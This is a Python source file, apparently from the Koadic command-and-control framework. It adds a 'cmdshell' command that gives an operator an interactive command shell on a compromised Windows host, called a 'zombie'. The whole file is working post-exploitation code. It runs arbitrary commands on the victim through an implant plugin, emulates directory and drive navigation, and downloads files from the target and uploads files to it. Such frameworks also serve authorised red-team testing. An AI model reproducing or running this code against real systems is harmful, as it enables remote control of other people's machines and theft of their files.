DESCRIPTION = "command shell to interact with a zombie"

def autocomplete(shell, line, text, state):
    if len(line.split()) > 1:
        return None

    options = []

    for skey, session in shell.sessions.items():
        if session.killed == False:
            options.append(str(session.id))

    try:
        return options[state]
    except:
        return None

def help(shell):
    shell.print_plain("")
    shell.print_plain("Use %s to interact with a particular zombie." % (shell.colors.colorize("cmdshell ZOMBIE_ID", shell.colors.BOLD)))
    shell.print_plain("")

def get_prompt(shell, id, ip, cwd, isreadline = True):
        return "%s%s: %s%s" % (shell.colors.colorize("[", [shell.colors.NORMAL], isreadline),
                                 shell.colors.colorize("koadic", [shell.colors.BOLD], isreadline),
                                 shell.colors.colorize("ZOMBIE %s (%s)" % (id, ip), [shell.colors.CYAN], isreadline),
                                 shell.colors.colorize(" - %s]> " % (cwd), [shell.colors.NORMAL], isreadline))

def cmdshell_help(shell):
    shell.print_plain("\tdownload PATH  - download a file off of the target")
    shell.print_plain("\tupload LPATH   - upload a local relatively pathed file to the target in the current directory")
    shell.print_plain("\tcd [/d] PATH   - this operates mostly how you would expect")
    shell.print_plain("\tDRIVE_LETTER:  - change the shell to the defined drive letter (e.g. D:)")
    shell.print_plain("\texit / quit    - leave this shell and return to Koadic")

def run_cmdshell(shell, session):
    import copy
    import os

    exec_cmd_name = 'implant/manage/exec_cmd'
    download_file_name = 'implant/util/download_file'
    upload_file_name= 'implant/util/upload_file'
    # this won't work, Error: "can't pickle module objects"
    #plugin = copy.deepcopy(shell.plugins['implant/manage/exec_cmd'])
    plugin = shell.plugins[exec_cmd_name]
    download_file_plugin = shell.plugins[download_file_name]
    upload_file_plugin = shell.plugins[upload_file_name]

    # copy (hacky shit)
    old_prompt = shell.prompt
    old_clean_prompt = shell.clean_prompt
    old_state = shell.state

    old_zombie = plugin.options.get("ZOMBIE")
    old_dir = plugin.options.get("DIRECTORY")
    old_out = plugin.options.get("OUTPUT")
    old_cmd = plugin.options.get("CMD")

    id = str(session.id)
    ip = session.ip

    emucwd = session.realcwd
    startdrive = emucwd.split(":")[0]
    curdrive = startdrive
    drivepathmap = {}

    shell.print_status("Press '?' for extra commands")

    while True:
        shell.state = exec_cmd_name
        shell.prompt = get_prompt(shell, id, ip, emucwd, True)
        shell.clean_prompt = get_prompt(shell, id, ip, emucwd, False)
        plugin.options.set("ZOMBIE", id)
        plugin.options.set("DIRECTORY", "%TEMP%")
        plugin.options.set("OUTPUT", "true")

        try:
            import readline
            readline.set_completer(None)
            cmd = shell.get_command(shell.prompt)
            if shell.spool:
                shell.spool_log(shell.clean_prompt, cmd)

            if len(cmd) > 0:
                if cmd.lower() in ['exit','quit']:
                    return
                elif cmd.split()[0] == '?':
                    cmdshell_help(shell)
                    continue
                elif cmd.split()[0].lower() == 'download' and len(cmd.split()) > 1:
                    old_download_zombie = download_file_plugin.options.get("ZOMBIE")
                    old_download_rfile = download_file_plugin.options.get("RFILE")
                    download_file_plugin.options.set("ZOMBIE", id)
                    rfile = emucwd
                    if rfile[-1] != "\\":
                        rfile += "\\"
                    rfile += " ".join(cmd.split(" ")[1:])
                    download_file_plugin.options.set("RFILE", rfile)
                    download_file_plugin.run()
                    download_file_plugin.options.set("ZOMBIE", old_download_zombie)
                    download_file_plugin.options.set("RFILE", old_download_rfile)
                    continue
                elif cmd.split()[0].lower() == 'upload' and len(cmd.split()) > 1:
                    old_upload_zombie = upload_file_plugin.options.get("ZOMBIE")
                    old_upload_lfile = upload_file_plugin.options.get("LFILE")
                    old_upload_dir = upload_file_plugin.options.get("DIRECTORY")
                    upload_file_plugin.options.set("ZOMBIE", id)
                    lfile = cmd.split()[1]
                    upload_file_plugin.options.set("LFILE", lfile)
                    upload_file_plugin.options.set("DIRECTORY", emucwd)
                    upload_file_plugin.run()
                    upload_file_plugin.options.set("ZOMBIE", old_upload_zombie)
                    upload_file_plugin.options.set("LFILE", old_upload_lfile)
                    upload_file_plugin.options.set("DIRECTORY", old_upload_dir)
                    continue
                elif cmd.split()[0].lower() == 'cd' and len(cmd.split()) > 1:
                    dest = " ".join(cmd.split(" ")[1:])

                    if "/d" in dest:
                        dest = " ".join(dest.split(" ")[1:])

                    if ":" not in dest and ".." not in dest:
                        if emucwd[-1] != "\\":
                            emucwd += "\\"
                        emucwd += dest

                    elif ".." in dest:
                        for d in dest.split("\\"):
                            if ".." in d:
                                emucwd = "\\".join(emucwd.split("\\")[:-1])
                            else:
                                if emucwd[-1] != "\\":
                                    emucwd += "\\"
                                emucwd += d
                        if len(emucwd.split("\\")) == 1:
                            emucwd += "\\"

                    if dest[0] == "%" and dest[-1] == "%":
                        plugin.options.set("CMD", "echo %s" % dest)
                        plugin.run()
                        job = plugin.ret_jobs[0]
                        while True:
                            if job.results:
                                varpath = job.results
                                break
                        emucwd = varpath.split()[0]

                    if ":" in dest:
                        drive = dest.split(":")[0]
                        if drive != curdrive:
                            drivepathmap[curdrive] = emucwd
                            curdrive = drive
                            if dest[-1] == ":":
                                if curdrive in drivepathmap:
                                    emucwd = drivepathmap[curdrive]
                                else:
                                    emucwd = curdrive+":\\"
                            else:
                                emucwd = dest

                            shell.print_plain("Drive changed to "+curdrive)
                        else:
                            if dest[-1] != ":":
                                emucwd = dest

                    cmd = "cd /d "+emucwd+ " & cd"
                elif len(cmd.split()) == 1 and cmd[-1] == ":":
                    drivepathmap[curdrive] = emucwd
                    curdrive = cmd.split(":")[0].upper()
                    if curdrive in drivepathmap:
                        emucwd = drivepathmap[curdrive]
                    else:
                        emucwd = curdrive+":\\"
                    shell.print_plain("Drive changed to "+curdrive)
                    continue
                else:
                    if emucwd:
                        cmd = "cd /d "+emucwd+" & "+cmd

                plugin.options.set("CMD", cmd)
                plugin.run()
        except KeyboardInterrupt:
            shell.print_plain(shell.clean_prompt)
            return
        except EOFError:
            shell.print_plain(shell.clean_prompt)
            return
        finally:
            plugin.options.set("ZOMBIE", old_zombie)
            plugin.options.set("CMD", old_cmd)
            plugin.options.set("DIRECTORY", old_dir)
            plugin.options.set("OUTPUT", old_out)

            shell.prompt = old_prompt
            shell.clean_prompt = old_clean_prompt
            shell.state = old_state


def execute(shell, cmd):
    splitted = cmd.split()
    if len(splitted) > 1:
        target = splitted[1]

        for session in [session for skey, session in shell.sessions.items()]:
            if target != str(session.id):
                continue
            if not session.killed:
                run_cmdshell(shell, session)
                return
            else:
                shell.print_error("This zombie has been killed, you can not interact with it.")
                return

        shell.print_error("Zombie #%s not found." % (target))
    else:
        shell.print_error("You must provide a zombie number as an argument.")
